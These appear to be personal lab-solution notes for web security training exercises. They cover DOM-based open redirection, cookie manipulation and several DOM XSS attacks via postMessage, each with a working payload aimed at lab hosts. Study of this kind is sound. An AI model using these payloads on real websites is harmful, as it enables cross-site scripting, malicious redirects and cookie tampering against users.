### DOM-based open redirection
```html
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : '\'">Back to Blog</a>
```
on regex, it's like that should contain parameter with start `url=` then on condition `returnUrl ? ...` will take the second url
`https://0ad400e604c1d0ef813d66d3006d00db.web-security-academy.net/post?postId=9&url=https://exploit-0ac800ef04cad086813e659301d000bc.exploit-server.net/exploit`

### DOM-based cookie manipulation
```html
<iframe src="https://0aea0019049578c1809b124f0082004e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="window.location=https://0aea0019049578c1809b124f0082004e.web-security-academy.net/">
```
put it on exploit server, cause the system will save the url to `previousUrl` cookie, so using onload to make it after visit the malicious payload, it would redirect to homepage, so the payload working

### DOM XSS using web messages
```html
<iframe src="https://0ac2005304d9fc7c9377146a00960087.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### DOM XSS using web messages and a JavaScript URL
```html
<iframe src="https://0aac002703010d3c80a40da000b800c7.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

### DOM XSS using web messages and JSON.parse
```html
<iframe src=https://0afd0051046fc0d0807d03a700a80009.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
